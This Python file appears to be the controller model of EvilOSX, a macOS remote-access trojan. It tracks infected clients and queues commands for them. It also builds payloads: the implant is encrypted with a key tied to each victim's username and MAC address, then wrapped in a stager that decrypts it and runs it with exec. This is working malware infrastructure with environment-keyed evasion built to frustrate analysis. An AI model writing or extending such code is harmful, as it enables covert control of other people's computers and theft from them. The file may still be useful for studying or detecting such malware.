"""The model used by the controller."""
__author__ = "Marten4n6"
__license__ = "GPLv3"

import sqlite3
import json
from threading import Lock
import os
import fnmatch
import importlib.util
import random
import string
import base64
from textwrap import dedent
from Cryptodome.Cipher import AES


class Command:
    """This class represents a command."""

    def __init__(self, client_id: str, command: str, module_name: str="", is_task: bool=False):
        """
        :param client_id: The ID of the client which should execute this command.
        :param command: The base64 command (or module code) to execute on the client.
        :param module_name: The name of the module being executed.
        :param is_task: True if this module is a task.
        """
        self.id = client_id
        self.command = command
        self.module_name = module_name
        self.is_task = is_task

    def __str__(self):
        """:return The JSON representation of this class."""
        # Note to self: this will throw an error if any parameter is bytes, thanks python3...
        return json.dumps(self.__dict__)


class Client:
    """This class represents a client."""

    def __init__(self, client_id: str, username: str, hostname,
                 remote_ip: str, path: str, last_online: str, loader_name: str):
        self.id = client_id
        self.username = username
        self.hostname = hostname
        self.remote_ip = remote_ip
        self.path = path
        self.last_online = last_online
        self.loader_name = loader_name


class ClientModel:
    """This class stores client sessions and pending commands via SQLite (thread safe)."""

    def __init__(self):
        self._database = sqlite3.connect("EvilOSX.db", check_same_thread=False)
        self._cursor = self._database.cursor()
        self._lock = Lock()  # We want all database operations synchronized

        # Setup the database
        self._cursor.execute("DROP TABLE IF EXISTS clients")
        self._cursor.execute("DROP TABLE IF EXISTS commands")
        self._cursor.execute("CREATE TABLE clients("
                             "client_id string PRIMARY KEY, "
                             "username text, "
                             "hostname text, "
                             "remote_ip text, "
                             "path text, "
                             "last_online text, "
                             "loader_name text)")
        self._cursor.execute("CREATE TABLE commands("
                             "client_id string, "
                             "command text, "
                             "module_name text, "
                             "is_task boolean)")
        self._database.commit()

    def add_client(self, client: Client):
        """Adds a client session."""
        with self._lock:
            self._cursor.execute("INSERT INTO clients VALUES (?,?,?,?,?,?,?)",
                                 (client.id, client.username, client.hostname, client.remote_ip,
                                  client.path, client.last_online, client.loader_name))
            self._database.commit()

    def get_client(self, client_id: int) -> Client:
        """:return The client session of the specified ID, otherwise None."""
        with self._lock:
            response = self._cursor.execute("SELECT * FROM clients WHERE client_id = ?",
                                            (client_id,)).fetchone()
            if response:
                return Client(
                    response[0], response[1], response[2], response[3],
                    response[4], response[5], response[6]
                )

    def remove_client(self, client_id: int):
        """Removes the client session."""
        with self._lock:
            self._cursor.execute("DELETE FROM clients WHERE client_id = ?",
                                 (client_id,))
            self._database.commit()

    def get_clients(self) -> list:
        """:return A list of all clients."""
        clients = []

        with self._lock:
            response = self._cursor.execute("SELECT * FROM clients").fetchall()

            for row in response:
                clients.append(Client(row[0], row[1], row[2], row[3], row[4], row[5], row[6]))
        return clients

    def has_clients(self) -> bool:
        """:return True if there are available clients."""
        with self._lock:
            response = self._cursor.execute("SELECT * FROM clients LIMIT 1")

            if response.fetchone() is None:
                return False
            else:
                return True

    def send_command(self, command: Command):
        """Adds a command for the client to execute."""
        with self._lock:
            self._cursor.execute("INSERT INTO commands VALUES(?,?,?,?)", (
                command.id, command.command, command.module_name, command.is_task
            ))
            self._database.commit()

    def remove_command(self, client_id: int):
        """Removes the first command so the next will be on top."""
        with self._lock:
            # Workaround for https://sqlite.org/compile.html#enable_update_delete_limit
            self._cursor.execute("DELETE FROM commands WHERE rowid = "
                                 "(SELECT rowid FROM commands WHERE client_id = ? LIMIT 1)", (client_id,))
            self._database.commit()

    def get_command(self, client_id: int) -> Command:
        """:return The first command in the list for the client to execute.

        Once the command is sent to the client remove_command should be called.
        """
        with self._lock:
            response = self._cursor.execute("SELECT * FROM commands WHERE client_id = ?",
                                            (client_id,)).fetchone()
            if response:
                command = Command(response[0], response[1], response[2], response[3])
                return command

    def update_client(self, client_id: int, path: str, last_online: str):
        """Updates the client's path and last online time."""
        with self._lock:
            self._cursor.execute("UPDATE clients SET path = ?, last_online = ? WHERE client_id = ?",
                                 (path, last_online, client_id))
            self._database.commit()

    def close(self):
        """Closes the database."""
        self._database.close()


def _load_module(module_name: str, module_path: str):
    """Loads a module."""
    # "One might think that python imports are getting more and more complicated with each new version."
    # Taken from https://stackoverflow.com/a/67692
    spec = importlib.util.spec_from_file_location(module_name, module_path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


class ModuleFactory:
    """Handles loading modules."""

    def __init__(self):
        self._modules = {}
        self._load_modules()

    def _load_modules(self):
        """Loads all modules."""
        for root, dirs, files in os.walk("modules"):
            for file_name in fnmatch.filter(files, "*.py"):
                module_name = file_name[0:-3]
                module_path = os.path.realpath(os.path.join(root, file_name))

                if module_name in ["__init__", "template", "helpers"]:
                    continue

                self._modules[module_name] = _load_module(module_name, module_path).Module()

    def get_modules(self) -> dict:
        """:return A dict containing the module's name and class."""
        return self._modules

    def get_module(self, module_name: str):
        """:return The class of the specified module name."""
        return self._modules[module_name]


class LoaderFactory:
    def __init__(self):
        self._loaders = {
            "helpers": _load_module("helpers", os.path.join(os.path.dirname(__file__), "loaders", "helpers.py"))
        }
        self._load_loaders()

    def _load_loaders(self):
        """Loads all loaders."""
        for root, dirs, files in os.walk(os.path.join(os.path.dirname(__file__), "loaders")):
            for file_name in fnmatch.filter(files, "*.py"):
                loader_name = file_name[0:-3]
                loader_path = os.path.join(root, file_name)

                if loader_name in ["__init__", "template", "helpers"]:
                    continue

                self._loaders[loader_name] = _load_module(loader_name, loader_path).Loader()

    def get_loaders(self):
        """:return A list of loader classes."""
        loaders = dict(self._loaders)

        loaders.pop("helpers")
        return loaders

    def get_loader(self, index):
        """:return A tuple containing the loader's name and class."""
        for i, (key, loader) in enumerate(self.get_loaders().items()):
            if i == index:
                return key, loader


class PayloadFactory:
    """Builds encrypted payloads which can only be run on the specific client."""

    def __init__(self, loader_factory: LoaderFactory):
        self._loader_factory = loader_factory

    @staticmethod
    def _random_string(size=None, numbers=False):
        """:return A randomly generated string of x characters.

        If no size is specified, a random number between 6 and 15 will be used.
        """
        name = ""
        if not size:
            size = random.randint(6, 15)

        for i in range(0, size):
            if not numbers:
                name += random.choice(string.ascii_letters)
            else:
                name += random.choice(string.ascii_letters + string.digits)
        return name

    def create_payload(self, payload_options: dict, loader_options: dict, client_key: str) -> str:
        """Creates the encrypted payload which the stager will run."""
        configured_payload = ""

        # Configure payload (set variables)
        server_host = payload_options["host"]
        server_port = payload_options["port"]
        program_directory = payload_options["program_directory"]
        loader_name = payload_options["loader_name"]

        with open(os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir, "EvilOSX.py")), "r") as input_file:
            for line in input_file:
                if line.startswith("# Random Hash: "):
                    configured_payload += "# Random Hash: %s\n" % (
                        self._random_string(numbers=True)
                    )
                elif line.startswith("SERVER_HOST = "):
                    configured_payload += "SERVER_HOST = \"%s\"\n" % server_host
                elif line.startswith("SERVER_PORT = "):
                    configured_payload += "SERVER_PORT = %s\n" % server_port
                elif line.startswith("PROGRAM_DIRECTORY = "):
                    configured_payload += "PROGRAM_DIRECTORY = os.path.expanduser(\"%s\")\n" % program_directory
                elif line.startswith("LOADER_OPTIONS = "):
                    # We also want access to the program directory and loader name.
                    loader_options[loader_name]["program_directory"] = program_directory
                    loader_options[loader_name]["loader_name"] = loader_name

                    configured_payload += "LOADER_OPTIONS = json.loads('%s')\n" % (
                        json.dumps(loader_options[loader_name]),
                    )
                else:
                    configured_payload += line

        # Return the loader which the stager will run
        return self._create_loader(loader_name, loader_options, payload_options, dedent("""\
        #!/usr/bin/env python
        # -*- coding: utf-8 -*-
        import os
        import getpass
        import uuid
        
        def get_uid():
            return "".join(x.encode("hex") for x in (getpass.getuser() + "-" + str(uuid.getnode())))
        
        exec("".join(os.popen("echo '{}' | openssl aes-256-cbc -A -d -a -k %s -md md5" % get_uid()).readlines()))
        """.format(self._openssl_encrypt(client_key, configured_payload).decode())))

    def _openssl_encrypt(self, password, plaintext, msgdgst='md5'):
        # Thanks to Joe Linoff:
        # https://stackoverflow.com/a/42773185
        salt = os.urandom(8)
        key, iv = self._get_key_and_iv(password, salt, msgdgst=msgdgst)
        if key is None:
            return None

        # PKCS#7 padding
        padding_len = 16 - (len(plaintext) % 16)
        if isinstance(plaintext, str):
            padded_plaintext = plaintext + (chr(padding_len) * padding_len)
        else:
            padded_plaintext = plaintext + (bytearray([padding_len] * padding_len))

        # Encrypt
        cipher = AES.new(key, AES.MODE_CBC, iv)
        cipher_text = cipher.encrypt(padded_plaintext.encode())

        # Make OpenSSL compatible
        openssl_ciphertext = b'Salted__' + salt + cipher_text
        b64 = base64.b64encode(openssl_ciphertext)

        return b64

    @staticmethod
    def _get_key_and_iv(password, salt, klen=32, ilen=16, msgdgst='md5'):
        mdf = getattr(__import__('hashlib', fromlist=[msgdgst]), msgdgst)
        password = password.encode('ascii', 'ignore')

        try:
            maxlen = klen + ilen
            keyiv = mdf(password + salt).digest()
            tmp = [keyiv]
            while len(tmp) < maxlen:
                tmp.append(mdf(tmp[-1] + password + salt).digest())
                keyiv += tmp[-1]  # Append the last byte
            key = keyiv[:klen]
            iv = keyiv[klen:klen + ilen]
            return key, iv
        except UnicodeDecodeError:
            return None, None

    def _create_loader(self, loader_name: str, loader_options: dict, payload_options: dict, payload: str) -> str:
        """Wraps the payload in the specified loader."""
        return self._loader_factory.get_loaders()[loader_name].generate(
            loader_options[loader_name], payload_options, payload
        )
